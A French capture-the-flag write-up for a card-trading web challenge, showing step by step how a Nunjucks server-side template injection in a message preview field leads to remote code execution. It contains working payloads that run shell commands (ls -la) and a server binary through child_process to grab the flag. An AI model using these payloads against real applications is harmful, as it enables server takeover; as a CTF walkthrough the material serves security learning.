# Writeup - Echange moi si tu peux

## Préparer un échange

Le compte commence sans carte. Il faut d'abord ouvrir un booster, puis aller sur le profil d'un collectionneur actif et sélectionner une carte de son classeur. Le formulaire permet alors de proposer une de nos cartes et de personnaliser le message.

Le texte indique que des expressions comme `{{ to }}` sont interprétées par le serveur. Un premier test dans le champ **Message** confirme que le moteur évalue des expressions arbitraires :

```nunjucks
{{ 7 * 7 }}
```

Le bouton **Prévisualiser le message** affiche `49`.

## Explorer le serveur

Le moteur Nunjucks expose la fonction `range`. Son constructeur permet de créer une fonction JavaScript. Avec Node 22, `process.getBuiltinModule()` donne accès aux modules natifs sans utiliser `require`, indisponible dans ce projet en modules ES.

Ce payload affiche le contenu du dossier de travail du serveur :

```nunjucks
{{ range.constructor("return global.process.getBuiltinModule('child_process').execSync('ls -la').toString()")() }}
```

La prévisualisation révèle notamment l'exécutable `/app/get_card`.

## Récupérer la carte

Le payload final lance cet exécutable avec le même binaire Node que le serveur :

```nunjucks
{{ range.constructor("return global.process.getBuiltinModule('child_process').execFileSync(global.process.execPath, ['/app/get_card']).toString()")() }}
```

La prévisualisation répond :

```text
Carte Suprême ajoutée à votre collection.
```

Il suffit ensuite de revenir dans **Collection** ou de recharger la page. La carte Suprême Nature est maintenant réellement attribuée au compte et son nom contient le flag :

```text
CYBN{...}
```

Il n'est pas nécessaire d'envoyer l'échange : la prévisualisation vulnérable suffit. Les payloads basés sur `process.mainModule.require(...)` échouent ici, car l'application utilise les modules ES et `mainModule` n'expose pas `require`.
